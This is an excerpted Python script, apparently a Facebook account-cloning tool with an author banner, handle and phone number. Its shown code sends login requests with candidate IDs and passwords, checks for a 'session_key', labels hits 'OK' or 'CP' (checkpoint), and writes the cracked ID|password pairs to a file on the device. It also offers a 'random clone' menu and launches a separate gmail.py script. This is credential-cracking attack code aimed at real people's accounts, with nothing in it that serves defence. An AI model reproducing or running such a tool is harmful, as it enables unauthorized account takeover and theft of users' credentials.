...
{W} [{R}+{W}]{W} FB ID   {R}:{W} 𝙈𝘿𝙅𝙊𝙆𝙀𝙍.5214
{W} [{R}+{W}]{W} WHATSAP {R}:{W} 0707266012
...
'Content-Type': 'application/x-www-form-urlencoded'}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{G} [𝙅𝙊𝙆𝙀𝙍-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [𝙅𝙊𝙆𝙀𝙍-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANA/𝙅𝙊𝙆𝙀𝙍-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
...
def Create_M2():
		...
		os.system('cd && cd FILE ;python gmail.py')
######RANDOM CLONE###
def Main_Menu():
    clear()
...
'Content-Length': '847'}
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [𝙅𝙊𝙆𝙀𝙍-OK] '+uid+' | '+pas+'\033[1;37m')
				...
				print(f'\r{W} [𝙅𝙊𝙆𝙀𝙍-CP] '+uid+' | '+pas+'\033[1;37m')
